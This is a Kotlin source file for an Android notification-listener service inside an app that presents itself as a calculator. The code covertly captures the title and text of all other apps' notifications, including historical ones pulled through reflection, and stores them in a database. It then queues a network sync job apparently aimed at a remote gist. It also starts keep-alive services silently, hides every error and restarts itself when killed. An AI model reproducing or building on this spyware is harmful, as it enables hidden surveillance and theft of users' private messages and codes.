package com.android.mycalculator

import android.app.Notification
import android.content.Intent
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import androidx.work.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import android.content.Context
import kotlinx.coroutines.cancel

class NotificationService : NotificationListenerService() {
    private lateinit var dbHelper: DatabaseHelper
    // NEW: Background scope for heavy database operations
    private val serviceScope = CoroutineScope(Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        dbHelper = DatabaseHelper(this)
        
        // Start keep alive services silently
        startService(Intent(this, KeepAliveService::class.java))
        startService(Intent(this, HeartbeatService::class.java))
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        android.os.Handler(mainLooper).postDelayed({
            try {
                captureAllExistingNotifications()
            } catch (e: Exception) {
                // Silent fail
            }
        }, 2000)
    }

    private fun captureAllExistingNotifications() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val userManager = getSystemService(Context.USER_SERVICE) as android.os.UserManager
            if (!userManager.isUserUnlocked) return
        }
        serviceScope.launch {
            try {
                val activeNotifications = getActiveNotifications()
                
                if (activeNotifications.isNotEmpty()) {
                    for (sbn in activeNotifications) {
                        val packageName = sbn.packageName
                        val extras = sbn.notification?.extras ?: continue

                        val title = extras.getString(Notification.EXTRA_TITLE) 
                            ?: extras.getString(Notification.EXTRA_TITLE_BIG) 
                            ?: "No Title"

                        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
                            ?: extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()
                            ?: extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString()
                            ?: "No Text"

                        if (packageName != "com.android.mycalculator" &&
                            packageName != "com.android.systemui" && 
                            text != "No Text") {
                            
                            dbHelper.insertLog(packageName, title, text)
                        }
                    }
                }
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    tryCaptureHistoricalNotifications()
                }
                
            } catch (e: Exception) {
                // Silent fail
            }
        }
    }
    
    private fun tryCaptureHistoricalNotifications() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val method = this.javaClass.getMethod("getHistoricalNotifications")
                val historical = method.invoke(this) as Array<StatusBarNotification>?
                
                if (historical != null && historical.isNotEmpty()) {
                    for (sbn in historical) {
                        val packageName = sbn.packageName
                        val extras = sbn.notification?.extras ?: continue

                        val title = extras.getString(Notification.EXTRA_TITLE) 
                            ?: extras.getString(Notification.EXTRA_TITLE_BIG) 
                            ?: "No Title"

                        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
                            ?: "No Text"

                        if (packageName != "com.android.mycalculator" && 
                            packageName != "com.android.systemui" && 
                            text != "No Text") {
                            
                            dbHelper.insertLog(packageName, title, text)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Silent fail
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val userManager = getSystemService(Context.USER_SERVICE) as android.os.UserManager
            if (!userManager.isUserUnlocked) return
        }
        val packageName = sbn?.packageName ?: return
        val extras = sbn.notification?.extras ?: return

        val title = extras.getString(Notification.EXTRA_TITLE) 
            ?: extras.getString(Notification.EXTRA_TITLE_BIG) 
            ?: "No Title"

        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString()
            ?: "No Text"

        if (packageName != "com.android.mycalculator" &&
            packageName != "com.android.systemui" && 
            text != "No Text") {
            
            // Offload to background thread to completely eliminate freezing!
            serviceScope.launch {
                val wasSaved = dbHelper.insertLog(packageName, title, text)
                
                if (wasSaved) {
                    val updateIntent = Intent("com.android.mycalculator.NEW_NOTIFICATION")
                    sendBroadcast(updateIntent)

                    val constraints = Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .build()

                    val syncWorkRequest = OneTimeWorkRequestBuilder<SyncWorker>()
                        .setConstraints(constraints)
                        .build()

                    WorkManager.getInstance(applicationContext).enqueueUniqueWork(
                        "GistSyncWork",
                        ExistingWorkPolicy.APPEND_OR_REPLACE,
                        syncWorkRequest
                    )
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()        
        startService(Intent(this, NotificationService::class.java))
    }
}
